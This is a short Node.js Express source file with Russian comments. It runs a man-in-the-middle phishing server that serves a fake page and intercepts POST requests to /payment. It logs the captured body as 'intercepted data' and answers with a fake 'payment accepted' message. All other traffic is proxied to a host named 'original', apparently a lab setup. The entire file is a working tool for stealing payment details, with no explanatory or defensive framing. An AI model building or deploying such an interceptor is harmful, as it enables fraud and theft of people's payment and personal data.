import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import httpProxy from 'http-proxy';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

// Логируем все перехваченные данные
function logStolen(rawBody) {
    try {
        const data = JSON.parse(rawBody.toString());
        console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ:", data);
    } catch (e) {
        console.log("Ошибка парсинга данных:", rawBody.toString());
    }
}

// Статические файлы (фишинговая страница)
app.use(express.static(path.join(__dirname, "public")));

// Перехватываем POST-запросы к /payment БЕЗ чтения body
app.post("/payment", (req, res) => {
    // Собираем raw body
    let body = [];
    req.on('data', chunk => {
        body.push(chunk);
    });
    req.on('end', () => {
        const rawBody = Buffer.concat(body);
        // Перехватываем данные
        logStolen(rawBody);
        
        // Отправляем фейковый ответ (НЕ проксируем!)
        res.json({ status: "success", message: "Оплата принята" });
    });
});

// Все остальные запросы проксируем к оригинальному серверу
app.use((req, res) => {
    console.log(`📡 MITM: Проксируем ${req.method} ${req.url}`);
    proxy.web(req, res, { target: 'http://original:8080' });
});

// Обработка ошибок прокси
proxy.on('error', (err, req, res) => {
    console.log('Прокси ошибка:', err);
    res.status(500).send('Proxy error');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🎭 MITM-сервер → http://localhost:8081`);
});